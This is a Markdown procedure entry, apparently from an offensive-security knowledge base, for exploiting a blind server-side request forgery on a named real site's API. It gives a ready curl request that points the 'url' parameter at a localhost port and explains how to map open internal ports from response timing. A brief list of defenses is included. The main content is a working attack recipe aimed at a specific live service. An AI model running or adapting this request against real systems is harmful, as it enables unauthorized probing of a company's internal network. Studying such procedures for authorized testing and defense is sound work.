---
id: proc-tumblr-internal-ssrf-001
tags:
  - ssrf
  - internal
  - localhost
  - tumblr
type: procedure
tools:
  - '[[tools/Burp-Suite-Proxy]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-internal-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.730Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Internal-SSRF-with-Localhost-URL

## Summary

This procedure tests SSRF by setting the 'url' parameter to a localhost address, observing blind responses to confirm internal access and infer service availability via timing.

## Description

The endpoint fetches internal URLs like http://127.0.0.1:9090/ without blocking localhost. Since it's blind, no direct content is returned, but HTTP status (e.g., 200 with 404 body) and response delays indicate if the port is open (slower due to connection attempt) or closed.

## Requirements

1. Authenticated session and proxy setup
2. Knowledge of potential internal ports (e.g., 9090 for testing)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize URL parameters to block localhost and internal IPs (127.0.0.0/8, 10.0.0.0/8, etc.)
- Detect timing-based anomalies in API response logs
- Use request signing or CSRF tokens for sensitive endpoints

## Objectives

1. Confirm internal SSRF capability
2. Probe localhost services blindly
3. Identify open ports via side-channel timing

## Instructions

### Step 1: Modify to Localhost

**Context**: Set 'url' to internal address in intercepted request.

Edit in proxy: url=http://127.0.0.1:9090/.

**Command** ([[commands/curl-internal-ssrf-test]]):
```bash
curl -X GET "https://www.tumblr.com/api/v2/url_info?url=http://127.0.0.1:9090/&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary" -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
```

> Response: HTTP 200 with empty or 404-like body; time response (~500ms for open port).

### Step 2: Analyze Response

**Context**: Note status and timing.

No command; measure with proxy or repeated curls.

> Open port: Delayed response; closed: Immediate.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-internal-ssrf-test]]

## Tools Used

- [[tools/Burp-Suite-Proxy]]

## Tags

- ssrf
- internal
- localhost
- tumblr
